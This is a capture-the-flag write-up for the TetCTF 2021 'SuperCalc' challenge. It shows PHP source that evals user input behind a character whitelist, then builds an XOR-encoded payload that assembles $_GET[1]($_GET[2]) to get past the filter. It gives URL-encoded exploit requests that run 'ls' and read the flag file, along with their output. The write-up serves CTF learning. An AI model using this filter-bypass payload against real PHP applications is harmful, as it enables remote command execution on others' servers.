# SuperCalc
### TetCTF 2021

calc=// or / or . or .. gives internal server error...

When we don't pass the parameter "calc" in the URL, we get the source code:

``` php
<!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->

<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}
```

There's a very strict filter (`^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$`) that only allows:
- numbers (0-9)
- +, -, *, /
- ()
- ', ., ~, ^
- |, &

Hoever, we can maybe bypass it by converting there chars into others via XOR, OR and AND. Example: `'A' ^ '0' = 'q'`

So, we'll create a payload that uses others parameters such as $_GET[1], $_GET[2] etc. This makes it easier to insert any kind of code in the page/server.
We could execute something like `system('ls')` and the payload could be: `$_GET[1]($_GET[2])`. With this, `$_GET[1]` would be our function name (system) and `$_GET[2]` our parameter (ls).

We must find a way to "create" there chars:
`$` = 36
`_` = 95
`G` = 71
`E` = 69
`T` = 84
`[` = 91
`]` = 93

Trying to find the chars with python ([findingChars.py](https://github.com/Haltz01/CTFs_Writeups/blob/master/2021_TetCTF/SuperCalc/findingChars.py)), I only obtained 4 of there characters: $, G, E, T... But, with a 2nd round of enconding, it's possible to reach the other 3 chars:
```
'4' & '.' = '$'
'9' ^ '~' = 'G'
'9' ^ '|' = 'E'
'(' ^ '|' = 'T'
===============================
'0' ^ '1' ^ '^' = '_'
'0' ^ '3' ^ '^' = ']'
'0' ^ '5' ^ '^' = '['
```

To get `$_GET[1]($_GET[2])` in the code, we got a preg-matching payload: `('4'&'.').('0'^'1'^'^').('9'^'~').('9'^'|').('('^'|').('0'^'5'^'^').'1'.('0'^'3'^'^').'('.('4'&'.').('0'^'1'^'^').('9'^'~').('9'^'|').('('^'|').('0'^'5'^'^').'2'.('0'^'3'^'^').')'`

But now we must reduce its size to be under 70 chars...
`('4'&'.').('0'^'1'^'^').('9'^'~').('9'^'|').('('^'|').('0'^'5'^'^').'1'.('0'^'3'^'^').'('.('4'&'.').('0'^'1'^'^').('9'^'~').('9'^'|').('('^'|').('0'^'5'^'^').'2'.('0'^'3'^'^').')'` --nesting the ones with only 2 chars and using XOR--> `('4'&'.').('0'^'1'^'^').('99(99('^'~||~||').('0'^'5'^'^').'1'.('0'^'3'^'^').'('.('4'&'.').('0'^'1'^'^').('0'^'5'^'^').'2'.('0'^'3'^'^').')'` -> not enought (and this one is wrong, but whatever...) :(

To reduce the payload size, we can combine the chars if they all have the same amount of XOR operations.

Redoing all chars to be a combination of 3 XORs ([findingChars_XORs.py](https://github.com/Haltz01/CTFs_Writeups/blob/master/2021_TetCTF/SuperCalc/findingChars_XORs.py)):
```
'0' ^ '2' ^ '&' = '$'
'0' ^ '1' ^ '^' = '_'
'0' ^ ')' ^ '^' = 'G'
'0' ^ '^' ^ '+' = 'E'
'2' ^ '8' ^ '^' = 'T'
'0' ^ '5' ^ '^' = '['
'0' ^ '3' ^ '^' = ']'
And these are kinda simple, but I'll write them down:
'0' ^ '0' ^ '1' = '1'
'0' ^ '0' ^ '2' = '2'
'0' ^ '0' ^ '(' = '('
'0' ^ '0' ^ ')' = ')'
```

`$_GET[1]` = `('0'^'2'^'&').('0'^'1'^'^').('0'^')'^'^').('0'^'^'^'+').('2'^'8'^'^').('0'^'5'^'^').('0'^'0'^'1').('0'^'3'^'^')` 
= `'00002000' ^ '21)^8503' ^ '&^^+^^1^'` (nesting the XOR operations)
Similarly, `($_GET[2])` = `'0000020000' ^ '021)^85030' ^ '(&^^+^^2^)'`

Writting them together: `$_GET[1]($_GET[2])` = `'000020000000020000' ^ '21)^8503021)^85030' ^ '&^^+^^1^(&^^+^^2^)'`

Now, we finally have a payload:
` calc='000020000000020000'^'21)^8503021)^85030'^'&^^+^^1^(&^^+^^2^)'&1=system&2=ls `

URL encoding: `%27000020000000020000%27%5E%2721%29%5E8503021%29%5E85030%27%5E%27%26%5E%5E%2B%5E%5E1%5E%28%26%5E%5E%2B%5E%5E2%5E%29%27&1=system&2=ls`

And, IT WORKS!!!
``` html
Result: fl4g1sH3re.php index.php index.php
```

Now, we just have to read flagshere.php using `%27000020000000020000%27%5E%2721%29%5E8503021%29%5E85030%27%5E%27%26%5E%5E%2B%5E%5E1%5E%28%26%5E%5E%2B%5E%5E2%5E%29%27&1=system&2=cat+fl4g1sH3re.php`

There it is:
``` php
<?php

$flagflagflagflagflagflag = "TetCTF{_D0_Y0u_Know_H0w_T0_C4lculat3_1337?_viettel_*100*817632506233949#}";

?>
```

**FLAG: `TetCTF{_D0_Y0u_Know_H0w_T0_C4lculat3_1337?_viettel_*100*817632506233949#}`**